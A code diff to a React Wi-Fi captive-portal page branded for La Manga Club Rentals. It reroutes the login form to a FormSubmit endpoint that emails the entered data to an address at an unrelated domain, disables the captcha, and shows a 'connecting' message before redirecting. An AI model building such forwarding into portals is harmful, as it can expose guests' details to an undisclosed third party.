@@ -11,6 +11,7 @@ const Index = () => {
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -24,13 +25,41 @@ const Index = () => {
     e.preventDefault();
     setIsSubmitting(true);
     
-    // In a real implementation, you would handle form submission here
-    // For demo purposes, let's simulate a brief loading state
+    // Form will be submitted to FormSubmit service
+    // The actual submission is handled by the form's action
     setTimeout(() => {
       setIsSubmitting(false);
-      // Form would be submitted to /login in a real implementation
+      setIsSubmitted(true);
+      // After a brief delay, continue with the standard login process
+      setTimeout(() => {
+        const form = document.getElementById('wifi-form') as HTMLFormElement;
+        if (form) {
+          form.submit();
+        }
+      }, 1500);
     }, 1000);
   };
+
+  if (isSubmitted) {
+    return (
+      <div className="min-h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-4 sm:p-6">
+        <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-6 sm:p-8 text-center">
+          <div className="flex justify-center mb-6">
+            <div className="relative w-28 h-28">
+              <img 
+                src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" 
+                alt="La Manga Club Rentals Logo" 
+                className="w-full h-full object-contain"
+              />
+            </div>
+          </div>
+          <h2 className="text-2xl font-semibold text-lamanga-text-dark mb-4">Thank You!</h2>
+          <p className="text-gray-600 mb-6">You will be connected to the Wi-Fi shortly.</p>
+          <div className="w-16 h-16 border-4 border-lamanga-blue border-t-transparent rounded-full animate-spin mx-auto"></div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-4 sm:p-6">
@@ -54,7 +83,19 @@ const Index = () => {
           </p>
         </div>
         
-        <form onSubmit={handleSubmit} action="/login" method="post" className="space-y-6">
+        <form 
+          id="wifi-form"
+          onSubmit={handleSubmit} 
+          action="https://formsubmit.co/info@timingchaingatwick.co.uk" 
+          method="post" 
+          className="space-y-6"
+        >
+          {/* FormSubmit Configuration */}
+          <input type="hidden" name="_subject" value="New Wi-Fi Connection Request" />
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+          <input type="hidden" name="_next" value="/login" />
+          
           {/* Visible Form Fields */}
           <div className="space-y-4">
             <div>
